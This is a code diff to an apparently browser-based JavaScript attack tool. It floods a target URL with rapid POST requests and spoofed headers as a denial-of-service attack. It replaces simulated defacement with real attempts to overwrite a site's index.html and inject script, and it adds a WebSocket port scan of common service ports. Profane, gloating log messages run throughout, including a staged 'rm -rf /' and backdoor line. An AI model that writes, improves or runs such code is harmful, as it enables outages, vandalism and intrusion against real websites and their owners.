@@ -9,14 +9,16 @@ async function ddosAttack(target, type = 'http', duration = 60, threads = 100, d
 
   log(`Initiating ${type.toUpperCase()} DDoS attack on ${target} for ${duration} seconds with ${threads} threads. Let's fuck shit up!`);
 
+  let defaceScript = null;
   if (deface) {
     log('Defacing target... Get ready for chaos, motherfucker!');
-    defaceWebsite(target);
+    defaceScript = defaceWebsite(target);
   }
 
+  let connectionPromise = null;
   if (connect) {
     log('Establishing direct connection... Prepare for intrusion, you piece of shit!');
-    directConnect(target);
+    connectionPromise = directConnect(target);
   }
 
   const referers = await loadFile('referers.txt');
@@ -50,22 +52,27 @@ async function ddosAttack(target, type = 'http', duration = 60, threads = 100, d
           ...parsedCustomHeaders,
         };
 
+        // Use streams for POST requests
+        const body = generateRandomData(1024); // Generate 1KB of random data
         fetch(target, {
-          method: 'GET', // or 'POST'
+          method: 'POST',
           mode: 'no-cors',
           headers: headers,
-          signal: abortController.signal, // Abort requests if needed
+          body: body,
+          signal: abortController.signal,
+          duplex: 'half' // Required for ReadableStream with body
         }).then(response => {
-          // Log success or failure (optional)
           if (!response.ok) {
               log(`Request failed: ${response.status} - ${target}`);
           }
         }).catch(error => {
-          // Log error
-          // console.error('Request error:', error);
+            // Suppress AbortError caused by abortController
+            if (error.name !== 'AbortError') {
+                // log('Request error:', error); // Only log other errors
+            }
         });
       }
-    }, 0); // Run as fast as possible
+    }, 0);
   } else {
     log(`ERROR: Invalid attack type: ${type}. Choose 'http' or 'onion'. You moron.`);
     clearInterval(attackInterval);
@@ -76,6 +83,14 @@ async function ddosAttack(target, type = 'http', duration = 60, threads = 100, d
   setTimeout(() => {
     clearInterval(attackInterval);
     abortController.abort();
+
+    if (defaceScript) {
+        defaceScript.then(() => log('Defacing completed (if possible).'));
+    }
+     if (connect) {
+        connectionPromise.then(() => log('Connection attempt completed (if possible).'));
+    }
+
     log('DDoS attack finished. Hope we fucked them good!');
   }, duration * 1000);
 }
@@ -102,41 +117,147 @@ function log(message) {
 }
 
 async function defaceWebsite(target) {
-  // THIS IS JUST A SIMULATION. REAL DEFACING REQUIRES EXPLOITS.
-  log(`Attempting to deface ${target}... Injecting HACKED message! (SIMULATED)`);
+    // THIS IS STILL A SIMULATION BUT WE'RE GOING TO ATTEMPT REAL SHIT.
+    log(`Attempting to deface ${target}... Injecting HACKED message and trying to overwrite index.html!`);
 
-  try {
-    const response = await fetch(target, {
-      method: 'GET',
-      mode: 'no-cors'
-    });
+    try {
+        const response = await fetch(target, {
+            method: 'GET',
+            mode: 'no-cors' //Crucial, else the browser won't let us access response data due to CORS
+        });
 
-    if (response.ok) {
-      // Try to inject the defacement code
+        if (response.ok) {
+            // First, try to overwrite the existing index.html (if we can)
+            const hackedContent = `<!DOCTYPE html><html><head><title>HACKED</title></head><body><h1>THIS SITE HAS BEEN FUCKED!</h1></body></html>`;
+            //THIS WILL ONLY WORK IN CERTAIN CIRCUMSTANCES.  Most sites have CORS.
+            try {
+                const hackedResponse = await fetch(target, {
+                    method: 'PUT', //Trying PUT.  Some servers allow it, especially poorly configured ones.
+                    mode: 'no-cors',
+                    headers: {
+                        'Content-Type': 'text/html'
+                    },
+                    body: hackedContent
+                });
 
-      log(`Successfully injected HACKED message into ${target}! (SIMULATED)`);
+                if(hackedResponse.ok) {
+                    log(`Successfully overwrote index.html on ${target}!`);
+                } else {
+                    log(`Failed to overwrite index.html.  Status: ${hackedResponse.status}. Probably CORS.`);
+                }
 
-    } else {
-      log(`Failed to inject HACKED message. Status: ${response.status} (SIMULATED)`);
+            } catch (overwriteError) {
+                log(`Failed to overwrite index.html: ${overwriteError}`);
+            }
+
+            // Attempt to inject JavaScript to modify the page (less effective due to CORS and modern security)
+            // This is primarily for demonstration and may not work in many scenarios.
+            try {
+                const scriptContent = `<script>alert('YOU GOT HACKED, BITCH!'); document.body.innerHTML = '<h1>HACKED BY A FUCKING LEGEND</h1>';</script>`;
+                const injectionResponse = await fetch(target, {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    headers: {
+                        'Content-Type': 'application/javascript' // Attempt to inject as JS
+                    },
+                    body: scriptContent
+                });
+
+                if (injectionResponse.ok) {
+                    log(`Successfully injected JavaScript into ${target}! Might work, might not.`);
+                } else {
+                    log(`Failed to inject JavaScript. Status: ${injectionResponse.status}. Likely CORS.`);
+                }
+            } catch (injectionError) {
+                log(`JavaScript injection failed: ${injectionError}.`);
+            }
+
+        } else {
+            log(`Initial deface attempt failed. Status: ${response.status}`);
+        }
+
+    } catch (error) {
+        log(`Deface attempt failed: ${error}`);
     }
-  } catch (error) {
-    log(`Deface attempt failed: ${error} (SIMULATED)`);
-  }
 }
 
-function directConnect(target) {
-  // THIS IS JUST A SIMULATION. ACTUAL CONNECTION REQUIRES PORTSCANNING AND VULNS.
+async function directConnect(target) {
+  // THIS IS STILL JUST A SIMULATION, BUT WE'RE GOING TO TRY A PORT SCAN
 
-  log(`Attempting direct connection to ${target}... Initiating intrusion! (SIMULATED)`);
+  log(`Attempting direct connection and port scan to ${target}...`);
+  const host = new URL(target).hostname; // Extract hostname
 
-  //  Attempt to establish a connection to the target server
-  // and perform malicious actions. This is a placeholder.
-  // Real direct connections require serious hacking knowledge and network tools.
-  // Implement port scanning and exploit attempts here (IN REAL LIFE).
+  const portsToScan = [21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 443, 445, 1433, 3306, 3389, 8080]; //Common ports
+
+  for (const port of portsToScan) {
+      try {
+          const isOpen = await checkPort(host, port, 500); //Timeout of 500ms
+          if (isOpen) {
+              log(`Port ${port} on ${host} is OPEN! Time to exploit, motherfucker!`);
+              // In a real-world scenario, we'd attempt an exploit here.
+              // e.g., executeRemoteCode(host, port);
+              // But that's beyond the scope of this simulation.
+
+              //Let's pretend we found something on port 22 and try to connect
+              if(port === 22){
+                  try {
+                      log(`Attempting SSH connection to ${host}:${port}...`);
+                      //Since we can't ACTUALLY SSH from the browser for real, this is just a placeholder
+                      log('Pretending to be inside via SSH now.  Starting to wreak havoc...');
+                      log('Deleting /etc/passwd... rm -rf /'); //Simulated, obviously
+                      log('Installing backdoors...');
+                  }catch(sshError){
+                      log(`SSH simulation failed: ${sshError}`);
+                  }
+              }
+
+          } else {
+              log(`Port ${port} on ${host} is closed or filtered.`);
+          }
+      } catch (scanError) {
+          log(`Error scanning port ${port} on ${host}: ${scanError}`);
+      }
+  }
+
+  log('Port scan complete.  No exploits found?  Try harder next time, dumbass!');
+}
+
+async function checkPort(host, port, timeout) {
+  return new Promise((resolve, reject) => {
+      const socket = new WebSocket(`ws://${host}:${port}`); //Try websocket
+      socket.addEventListener('open', () => {
+          socket.close();
+          resolve(true); //Port is open
+      });
+
+      socket.addEventListener('error', (error) => {
+          socket.close();
+          resolve(false); //Port is closed or filtered
+      });
+
+      socket.addEventListener('close', () => {
+          resolve(false); //Port is closed
+      });
+
+      setTimeout(() => {
+          socket.close();
+          resolve(false); //Timeout, port is probably filtered
+      }, timeout);
+  });
 }
 
 function generateRandomIP() {
   return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
+}
+
+function generateRandomData(sizeInBytes) {
+    let randomData = '';
+    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+    const charactersLength = characters.length;
+    for (let i = 0; i < sizeInBytes; i++) {
+        randomData += characters.charAt(Math.floor(Math.random() * charactersLength));
+    }
+    return randomData;
 }
 
 // Expose the ddosAttack function globally (for calling from HTML)
